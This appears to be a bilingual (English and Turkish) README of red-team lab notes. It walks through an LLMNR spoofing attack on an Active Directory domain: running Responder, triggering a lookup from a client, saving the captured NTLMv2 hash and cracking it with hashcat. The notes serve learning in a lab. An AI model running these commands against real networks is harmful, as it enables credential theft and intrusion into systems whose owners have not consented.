# Active-Directory-Attacks
AD attack commands & notes for red team operations and learning.

🔧 LLMNR Spoofing Attack - Command Summary
🖥️ Lab Setup:
Windows Server 2019 – Domain Controller

Windows 10 – Domain-joined Client

Kali Linux – Attacker machine

⚙️ Step 1 - Run Responder

---> sudo responder -I vboxnet0 -w
ℹ️ Replace vboxnet0 with your active network interface (eth0, ens33, etc). You can list them with:
    --> ip a
    
📡 Step 2 - Trigger LLMNR Request from Victim
Run the following command on the Windows 10 Client:

---> net use \\fakename\share

🔐 Step 3 - Save the Captured Hash
Captured hashes are shown in Responder. Copy and paste the NTLMv2 hash into a file:

---> nano hash.txt

🧠 Step 4 - Crack the Hash using Hashcat

---> hashcat -m 5600 -a 0 hash.txt rockyou.txt

If rockyou.txt is compressed, unzip it first:
    --> gzip -d /usr/share/wordlists/rockyou.txt.gz

🧹 Optional - Flush DNS on Victim Machine

If Responder doesn’t capture a hash on retry:

--->ipconfig /flushdns
✅ If the password is cracked, the attack was successful.

🖼️ Screenshots and detailed explanations can be found in each step’s Markdown file.

----------------------------------------------------------------------------------------

🔧 LLMNR Spoofing Saldırısı - Komut Özeti
🖥️ Laboratuvar Yapısı:
Windows Server 2019 – Domain Controller

Windows 10 – Domaine dahil istemci

Kali Linux – Saldırgan makine

⚙️ 1. Adım - Responder'ı Başlat

--->sudo responder -I vboxnet0 -w
ℹ️ vboxnet0 yerine kendi aktif ağ arayüzünüzü yazın (eth0, ens33 vb). Arayüzleri listelemek için:
    -->ip a
    
📡 2. Adım - Kurban Cihazdan LLMNR İsteği Oluştur
Windows 10 Client üzerinde şu komutu çalıştırın:

--->net use \\fakename\share

🔐 3. Adım - Yakalanan Hash’i Kaydet
Responder tarafından yakalanan NTLM hash’i bir dosyaya kaydedin:

--->nano hash.txt

🧠 4. Adım - Hashcat ile Hash Kırma

--->hashcat -m 5600 -a 0 hash.txt rockyou.txt
Eğer rockyou.txt sıkıştırılmışsa, önce açın:

--->gzip -d /usr/share/wordlists/rockyou.txt.gz

🧹 Opsiyonel - DNS Cache Temizleme
Hash yakalanmıyorsa, hedef sistemde DNS önbelleğini temizleyin:

--->ipconfig /flushdns
✅ Eğer parola başarıyla kırıldıysa, saldırı başarılı olmuştur.

🖼️ Her adımın detayları ve ekran görüntüleri ilgili dosyalarda mevcuttur.
